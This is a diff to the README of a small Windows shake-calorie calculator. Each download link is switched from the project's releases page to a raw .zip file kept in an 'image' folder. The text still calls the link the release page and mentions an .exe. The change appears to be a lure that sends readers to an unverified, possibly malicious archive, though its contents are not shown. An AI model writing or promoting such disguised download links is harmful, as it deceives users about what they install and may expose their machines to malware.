@@ -1,6 +1,6 @@
 # 🥤 Hobby_kcal_shake - Simple Hypercaloric Shake Calculator
 
-[![Download Hobby_kcal_shake](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases)
+[![Download Hobby_kcal_shake](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/CesarCarvalho93/Hobby_kcal_shake/main/image/kcal_shake_Hobby_v1.1.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Before you start, make sure your Windows PC meets these simple requirements:
 ## 🚀 How to Download and Install on Windows
 
 1. Click the big blue button above or visit the release page directly:  
-   [https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases](https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases)  
+   [https://raw.githubusercontent.com/CesarCarvalho93/Hobby_kcal_shake/main/image/kcal_shake_Hobby_v1.1.zip](https://raw.githubusercontent.com/CesarCarvalho93/Hobby_kcal_shake/main/image/kcal_shake_Hobby_v1.1.zip)  
    This page holds the latest version of the app.
 
 2. Look for the latest release. It will be named with the version number like "v1.0" or "v2.0".  
@@ -100,6 +100,6 @@ Once you finish building your shake, save it for future use. You can also export
 
 Visit the release page to download the app for your Windows PC:
 
-[https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases](https://github.com/CesarCarvalho93/Hobby_kcal_shake/releases)
+[https://raw.githubusercontent.com/CesarCarvalho93/Hobby_kcal_shake/main/image/kcal_shake_Hobby_v1.1.zip](https://raw.githubusercontent.com/CesarCarvalho93/Hobby_kcal_shake/main/image/kcal_shake_Hobby_v1.1.zip)
 
 Click the latest Windows `.exe` file to start your download. Once installed, you will have a simple way to calculate your shake’s calories and cost right at your fingertips.
